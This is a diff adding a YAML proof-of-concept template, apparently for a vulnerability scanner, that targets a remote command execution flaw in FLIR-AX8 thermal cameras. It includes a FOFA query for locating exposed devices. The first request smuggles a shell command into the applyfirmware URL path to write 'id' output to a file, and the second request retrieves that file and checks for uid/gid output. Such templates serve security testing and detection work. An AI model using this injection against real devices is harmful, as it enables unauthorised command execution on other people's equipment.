@@ -1,0 +1,26 @@
+id: poc-yaml-flir-ax8-applyfirmware-rce
+info:
+  name: FLIR-AX8 applyfirmware 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: FLIR-AX8
+  fofa: app="FLIR-FLIR-AX8"
+variables:
+  t1: random_int(100,999)
+requests:
+- method: GET
+  path: /settings/applyfirmware/;id%3Etest{{.t1}}.txt;/false
+  expression: 'status_code == 302 &&
+
+    body == ""
+
+    '
+- method: GET
+  path: /test{{.t1}}.txt
+  expression: 'status_code == 200 &&
+
+    matches(body,`uid=\d+\(.*?\)\s+gid=\d+\(.*?\)`)
+
+    '
+transport: http
